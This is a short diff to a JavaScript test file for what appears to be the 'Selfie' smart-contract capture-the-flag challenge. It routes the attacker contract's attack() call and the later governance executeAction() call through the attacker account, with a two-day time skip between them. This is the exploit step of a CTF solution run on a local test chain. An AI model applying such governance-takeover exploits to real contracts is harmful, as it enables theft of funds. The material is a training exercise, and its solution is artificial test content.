@@ -39,7 +39,7 @@ describe('[Challenge] Selfie', function () {
     it('Exploit', async function () {
         let tx;
         let receipt;
-        tx = await this.attackerContract.attack();
+        tx = await this.attackerContract.connect(attacker).attack();
         receipt = await tx.wait();
 
         const logs = await this.governance.filters.ActionQueued(null, this.attackerContract.address);
@@ -49,7 +49,7 @@ describe('[Challenge] Selfie', function () {
         await ethers.provider.send('evm_increaseTime', [TWO_DAYS]); 
         await ethers.provider.send('evm_mine');
 
-        tx = await this.governance.executeAction(parseInt(actionId, 10));
+        tx = await this.governance.connect(attacker).executeAction(parseInt(actionId, 10));
         receipt = await tx.wait();
     });
 
